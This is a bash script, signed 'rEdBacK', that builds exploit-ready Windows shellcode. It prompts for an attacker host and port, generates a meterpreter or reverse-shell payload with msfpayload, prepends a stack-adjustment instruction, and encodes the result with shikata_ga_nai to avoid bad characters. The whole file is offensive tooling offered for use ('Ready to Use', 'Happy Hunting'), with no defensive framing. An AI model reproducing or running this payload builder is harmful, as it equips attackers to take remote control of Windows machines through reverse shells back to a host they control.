#!/bin/bash

echo -e "\e[1;34mThis Program will create Stack Adjust Shell code -- Created By \n"
echo -e "===========================================================\n" 
cat << "EOF"
 ██▀███  ▓█████ ▓█████▄  ▄▄▄▄    ▄▄▄       ▄████▄   ██ ▄█▀
▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▓█████▄ ▒████▄    ▒██▀ ▀█   ██▄█▒ 
▓██ ░▄█ ▒▒███   ░██   █▌▒██▒ ▄██▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██░█▀  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
░██▓ ▒██▒░▒████▒░▒████▓ ░▓█  ▀█▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░▒▓███▀▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒ ▒░▒   ░   ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
  ░░   ░    ░    ░ ░  ░  ░    ░   ░   ▒   ░        ░ ░░ ░ 
   ░        ░  ░   ░     ░            ░  ░░ ░      ░  ░   
                 ░            ░           ░      
EOF
echo -e "\n===========================================================\e[39m\n" 
echo -e "\e[31m"
read -p "Enter lhost : " host
read -p "Enter lport : " port 

echo -e "\e[39m\n=========================================================================\n"
echo -e "1.windows/meterpreter/reverse_ord_tcp"
echo -e "2.windows/windows/meterpreter/reverse_nonx_tcp"
echo -e "3.windows/shell/reverse_ord_tcp"
echo -e "4.windows/shell/reverse_nonx_tcp"
echo -e "\n=========================================================================\e[39m\n"

read -p "Enter Payload (Enter Full Payload) : " payload


echo -e "\e[39m\n[+] ------ Creating First Stage of Shellcode -------- [+]\n"
msfpayload $payload LHOST=$host LPORT=$port R > /tmp/payload 

echo -e "\n[+] ------ Successfully Created the First Stage Shellcode -------- [+]\n"

echo -e "\e[35m\n=========================================================================\n"

hexdump -C  /tmp/payload

echo -e "\n=========================================================================\e[39m\n"


echo -e "[+] ------ Creating Stack Adjustment Buffer -------- [+]\n"
perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > /tmp/stackadj

echo -e "[+] ------ Concatanating Shellcode + Stack Adjustment Buffer -------- [+]\n"
cat /tmp/stackadj /tmp/payload > /tmp/shellcode

echo -e "[+] ------ Successfully Created the Stack Adjusted Shellcode -------- [+]\n"

echo -e "\e[93m=========================================================================\n"

hexdump -C /tmp/shellcode

echo -e "\n=========================================================================\e[39m\n"

echo -e "[+] ------ Encoding Stack Adjusted Shellcode with shikata_ga_nai -------- [+]\n"
echo -e "\e[96m"
read -p "Enter the shellcode formate (E.g : c,python,perl,js) : " formate
read -p "Enter Bad Characters ( E.g : '\x00\xda' ) : " bad


echo -e "\e[39m\n[+] ------ Creating Final Buffer Shell Code Ready to Use -------- [+]\n"

echo -e "\e[91m=========================================================================\n"

cat /tmp/shellcode | msfencode -b $bad -e x86/shikata_ga_nai -t $formate

echo -e "\n=========================================================================\e[39m\n"

echo -e "\n[+] ------ Cleaning Junks -------- [+]"
rm /tmp/payload
rm /tmp/shellcode
rm /tmp/stackadj

echo -e "\e[93mThank you for using stack adjustment ... Happy Hunting "
echo -e "Coded By  rEdBacK \n" 


